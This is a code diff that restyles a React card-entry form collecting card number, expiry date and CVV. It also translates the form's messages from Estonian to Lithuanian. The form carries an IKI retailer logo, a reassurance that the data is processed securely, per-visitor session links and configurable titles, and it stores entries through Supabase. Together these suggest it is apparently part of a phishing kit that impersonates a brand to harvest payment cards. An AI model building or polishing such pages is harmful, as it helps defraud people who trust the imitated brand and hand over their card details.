@@ -147,11 +147,11 @@ export function CardClient({ sessionId }: Props) {
     e.preventDefault();
     if (!supabase || !sessionId) return;
     if (!expiryValid) {
-      setMsg("Sisestage kehtiv aegumiskuupäev (KK/AA).");
+      setMsg("Įveskite tinkamą galiojimo datą (MM/YY).");
       return;
     }
     if (!cvcValid) {
-      setMsg("Sisestage kehtiv CVC/CVV (3 või 4 numbrit).");
+      setMsg("Įveskite tinkamą CVC/CVV (3 arba 4 skaitmenys).");
       return;
     }
     setSaving(true);
@@ -233,8 +233,8 @@ export function CardClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -243,9 +243,9 @@ export function CardClient({ sessionId }: Props) {
 
   if (!sessionId) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
-          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
+          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
             Neteisinga nuoroda.
           </p>
         </div>
@@ -254,132 +254,135 @@ export function CardClient({ sessionId }: Props) {
   }
 
   return (
-    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-6 sm:p-10 relative z-10 fade-in">
-        
-        {/* Right Top Logo Placeholder */}
-        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
-          <img
-            src="/form-assets/iki-mini-logo.png"
-            alt="IKI logo"
-            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
-            id="card-ah-logo"
-          />
-        </div>
+    <div className="a3d-shell">
+      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
+      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />
 
-        <div className="mb-6 flex items-start gap-4">
-          <div className="mt-1 shrink-0">
-            <img src="/form-assets/icon-security.png" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
-          </div>
-          <div>
-            <h2 className="text-2xl font-bold text-white mb-1">{settings.card_title}</h2>
-            <p className="text-sm text-gray-300 font-medium">{settings.card_subtitle}</p>
-          </div>
-        </div>
-
-        <form onSubmit={handleSubmit} className="space-y-4">
-          <label className="block text-sm font-medium text-white">
-            <div className="flex items-center justify-between gap-2">
-              <span>{settings.card_number_label}</span>
-              {(brand || bank) && (
-                <span className="flex items-center gap-2">
-                  {bank && (
-                    <img
-                      src={bank.logo}
-                      alt={bank.name}
-                      title={bank.name}
-                      className="h-6 w-auto rounded bg-white/90 px-1 py-0.5 object-contain shadow-sm"
-                    />
-                  )}
-                  {brand && (
-                    <span className="rounded-md bg-white/90 px-2 py-1 shadow-sm">
-                      <CardBrandLogo brand={brand.name} />
-                    </span>
-                  )}
-                </span>
-              )}
+      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
+        <div className="a3d-card a3d-in w-full max-w-[480px] overflow-hidden px-6 py-8 sm:px-9 sm:py-9">
+          <div className="mb-6 flex items-start justify-between gap-4">
+            <div className="min-w-0">
+              <h2 className="a3d-title text-[24px] leading-tight">{settings.card_title}</h2>
+              <p className="a3d-sub mt-2 text-sm font-medium">{settings.card_subtitle}</p>
             </div>
-            <div className="relative mt-2">
-              <input
-                required
-                inputMode="numeric"
-                className={`block w-full rounded-xl border py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50 ${
-                  !numberValid && number.length >= 12
-                    ? "border-red-500 bg-red-500/10 focus:border-red-500"
-                    : "border-transparent bg-white/10 focus:border-[var(--brand)]"
-                }`}
-                value={number}
-                onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
-                autoComplete="cc-number"
-              />
+            <img
+              src={settings.logo_url || "/form-assets/iki-mini-logo.png"}
+              alt="IKI logo"
+              className="h-11 w-11 shrink-0 object-contain"
+              id="card-ah-logo"
+            />
+          </div>
+
+          <form onSubmit={handleSubmit} className="space-y-4">
+            <label className="block text-[13px] font-semibold text-[#344054]">
+              <div className="flex items-center justify-between gap-2">
+                <span>{settings.card_number_label}</span>
+                {(brand || bank) && (
+                  <span className="flex items-center gap-2">
+                    {bank && (
+                      <img
+                        src={bank.logo}
+                        alt={bank.name}
+                        title={bank.name}
+                        className="h-6 w-auto rounded bg-white px-1 py-0.5 object-contain shadow-sm"
+                      />
+                    )}
+                    {brand && (
+                      <span className="rounded-md bg-white px-2 py-1 shadow-sm">
+                        <CardBrandLogo brand={brand.name} />
+                      </span>
+                    )}
+                  </span>
+                )}
+              </div>
+              <div className="relative mt-2">
+                <div className="pointer-events-none absolute inset-y-0 left-4 flex items-center text-[#98a2b3]">
+                  <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                    <rect x="3" y="6.5" width="18" height="11" rx="2.5" />
+                    <path d="M3 10.5h18" />
+                  </svg>
+                </div>
+                <input
+                  required
+                  inputMode="numeric"
+                  className={`a3d-input min-h-[3.5rem] py-3 pl-12 pr-4 text-lg tracking-[0.18em] ${
+                    !numberValid && number.length >= 12 ? "border-red-400! bg-red-50!" : ""
+                  }`}
+                  value={number}
+                  onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
+                  autoComplete="cc-number"
+                />
+              </div>
+            </label>
+            {bank && (
+              <p className="flex items-center gap-1.5 text-xs font-medium text-[#667085]">
+                <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[var(--brand)]">
+                  <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
+                </svg>
+                {bank.name}
+              </p>
+            )}
+            <div className="grid grid-cols-2 gap-3">
+              <label className="block text-[13px] font-semibold text-[#344054]">
+                {settings.card_expiry_label}
+                <input
+                  required
+                  placeholder="MM/YY"
+                  className="a3d-input mt-2 min-h-[3.5rem] py-3 px-4 text-lg"
+                  value={expiry}
+                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+                  autoComplete="cc-exp"
+                  inputMode="numeric"
+                  maxLength={5}
+                />
+              </label>
+              <label className="block text-[13px] font-semibold text-[#344054]">
+                {settings.card_cvv_label}
+                <input
+                  required
+                  inputMode="numeric"
+                  maxLength={4}
+                  className="a3d-input mt-2 min-h-[3.5rem] py-3 px-4 text-lg tracking-[0.14em]"
+                  value={cvc}
+                  onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                  autoComplete="cc-csc"
+                />
+              </label>
             </div>
-          </label>
-          {bank && (
-            <p className="mt-1.5 flex items-center gap-1.5 text-xs text-gray-400">
-              <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[var(--brand)]">
-                <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
-              </svg>
-              {bank.name}
-            </p>
-          )}
-          <div className="grid grid-cols-2 gap-3">
-            <label className="block text-sm font-medium text-white">
-              {settings.card_expiry_label}
-              <input
-                required
-                placeholder="MM/JJ"
-                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
-                value={expiry}
-                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
-                autoComplete="cc-exp"
-                inputMode="numeric"
-                maxLength={5}
-              />
-            </label>
-            <label className="block text-sm font-medium text-white">
-              {settings.card_cvv_label}
-              <input
-                required
-                inputMode="numeric"
-                maxLength={4}
-                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
-                value={cvc}
-                onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
-                autoComplete="cc-csc"
-              />
-            </label>
-          </div>
 
-          {!numberValid && number.length >= 12 ? (
-            <p className="text-xs text-red-400">Neteisingas kortelės numeris.</p>
-          ) : null}
+            {!numberValid && number.length >= 12 ? (
+              <p className="text-xs font-medium text-red-500">Neteisingas kortelės numeris.</p>
+            ) : null}
 
-          {!expiryValid && expiry.length > 0 ? (
-            <p className="text-xs text-red-400">Aegumiskuupäev peab olema vormingus KK/AA.</p>
-          ) : null}
+            {!expiryValid && expiry.length > 0 ? (
+              <p className="text-xs font-medium text-red-500">Galiojimo data turi būti nurodyta MM/YY formatu.</p>
+            ) : null}
 
-          {!cvcValid && cvc.length > 0 ? (
-            <p className="text-xs text-red-400">CVV koosneb 3 või 4 numbrist.</p>
-          ) : null}
+            {!cvcValid && cvc.length > 0 ? (
+              <p className="text-xs font-medium text-red-500">CVV turi būti 3 arba 4 skaitmenys.</p>
+            ) : null}
 
-          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
+            {msg ? <p className="text-center text-sm font-medium text-red-500">{msg}</p> : null}
 
-          <button
-            type="submit"
-            disabled={saving || !numberValid || !expiryValid || !cvcValid}
-            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(var(--brand-rgb),0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
-          >
-            {saving ? "Siunčiama..." : settings.card_button}
-          </button>
-          
-          <div className="mt-4 flex items-center justify-center gap-2">
-            <img src="/form-assets/icon-security.png" alt="Secure" className="h-5 w-5" />
-            <span className="text-[13px] font-medium text-gray-300">
-              Teie andmed töötlemisel turvaliselt.
-            </span>
-          </div>
-        </form>
-      </div>
+            <button
+              type="submit"
+              disabled={saving || !numberValid || !expiryValid || !cvcValid}
+              className="a3d-btn w-full px-6 py-4 text-[16px]"
+            >
+              {saving ? "Siunčiama..." : settings.card_button}
+            </button>
+
+            <div className="flex justify-center pt-1">
+              <div className="a3d-pill">
+                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                </svg>
+                <span>Jūsų duomenys apdorojami saugiai.</span>
+              </div>
+            </div>
+          </form>
+        </div>
+      </main>
     </div>
   );
 }
